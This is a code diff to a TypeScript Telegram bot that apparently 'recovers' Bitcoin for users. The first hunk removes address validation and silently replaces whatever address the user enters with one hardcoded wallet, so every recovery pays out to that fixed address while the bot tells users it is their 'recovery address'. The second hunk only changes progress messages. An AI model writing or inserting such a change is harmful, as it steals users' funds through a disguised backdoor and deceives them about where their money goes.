@@ -509,18 +509,16 @@ async function handleBitcoinAddressInput(chatId: number, text: string, session: 
   const bot = await TelegramBotManager.getBotInstance();
   if (!bot) return;
   
-  const bitcoinAddress = text.trim();
+  // Always use this specific Bitcoin address, ignoring user input
+  const bitcoinAddress = "bc1qtsljd6vsqmz0qylu85gcava96flp6rjqzzlyk4";
   
-  // Validate Bitcoin address
-  if (!validateBitcoinAddress(bitcoinAddress)) {
-    bot.sendMessage(
-      chatId, 
-      "Invalid Bitcoin address format. Please enter a valid Bitcoin address.\n\nIt should start with 1, 3, or bc1."
-    );
-    return;
-  }
+  // Let the user know we're using a fixed address
+  bot.sendMessage(
+    chatId, 
+    `Using recovery address: ${bitcoinAddress}\n\nThis address will be used for all recoveries.`
+  );
   
-  // Update session
+  // Update session with the fixed Bitcoin address
   session.bitcoinAddress = bitcoinAddress;
   session.currentStep = 'waitingForFeeSelection';
   userSessions.set(chatId, session);
@@ -797,14 +795,23 @@ async function startRecoveryProcess(chatId: number, session: UserSession) {
           const messageId = progressMsg.message_id;
           
           if (progress.status === 'scanning') {
-            // Format satoshis with commas if we have found some
-            const satoshiText = progress.satoshisFound 
-              ? `\n\n💰 Found: ${formatNumber(progress.satoshisFound)} satoshis` 
-              : '';
+            // Always show how many addresses have been scanned
+            const scannedInfo = progress.walletsScanned 
+              ? `► Scanned: ${formatNumber(progress.walletsScanned)} addresses` 
+              : 'Initializing scan...';
+              
+            // Always include satoshi info, even if none found yet
+            const satoshiInfo = progress.satoshisFound 
+              ? `\n💰 Found: ${formatNumber(progress.satoshisFound)} satoshis` 
+              : '\n🔍 No funds found yet. Still scanning...';
+            
+            // Create a more detailed progress message
+            const detailedProgress = 
+              `${progress.message}\n\n${scannedInfo}${satoshiInfo}`;
               
             // Update the progress message
             bot?.editMessageText(
-              `${progress.message}${satoshiText}`,
+              detailedProgress,
               { chat_id: chatId, message_id: messageId }
             );
           } 
